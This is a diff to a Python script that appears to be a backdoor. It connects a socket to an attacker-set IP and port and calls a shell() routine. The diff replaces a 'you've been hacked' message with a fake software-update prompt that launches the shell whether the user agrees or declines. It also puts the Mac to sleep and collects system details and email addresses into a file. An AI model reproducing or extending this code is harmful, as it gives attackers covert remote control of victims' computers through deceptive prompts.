@@ -119,10 +119,6 @@ def infosec():
     import re
     import sys
     from datetime import datetime
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    c = s.getsockname()[0]
-    s.close()
     def convertTime(seconds):
         minutes, seconds = divmod(seconds, 60)
         hours, minutes = divmod(minutes, 60)
@@ -146,15 +142,14 @@ def infosec():
 
 
             
-    ha = c
     charge = f'{battery.percent} : {dt_string}'
     charge_status = f'{battery.power_plugged} : {dt_string}'
     remainder = convertTime(battery.secsleft)
     em_ad = email_addresses_list
-
+    
     f = open("system_info.txt", "a")
     f.write(f'''
-    hostname: {ha}
+    hostname:
     charge: {charge}
     charge status: {charge_status}
     time left with current charge: {remainder}
@@ -162,6 +157,7 @@ def infosec():
     {em_ad}
     ''')
     f.close()
+    print(f'1:@435:')
 
 def shell(senrev=senrev):
     global s
@@ -225,14 +221,31 @@ def shell(senrev=senrev):
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((IP, port))
-    print("!!you've been hacked!!")
+    print("Package is loading: ")
     time.sleep(2)
     os.system('pmset sleepnow')
     print('\n' * 50)
-    print('Hold up! we have a small error: ')
-    print('Trubleshooting our problem: maximum 3min')
-    #infosec()
-    shell()
+    print('Our systems detected an update')
+    print('This update should only take {3:00} minutes:')
+    print('Would you like to update?')
+    dele = input('[1=yes] >>') 
+
+    
+    if dele == '1':
+    	print('update has started: please wait')
+    	#infosec()
+    	shell()
+    	
+    else: 
+    	print('This program may run into issues without the update, please consider updating at a later date.')
+    	os.system('pmset sleepnow')
+    	print('\n' * 50)
+    	
+    	print('system bug: forced update begining...')
+    	#infosec()
+    	shell()
+    
+    
     
 
 
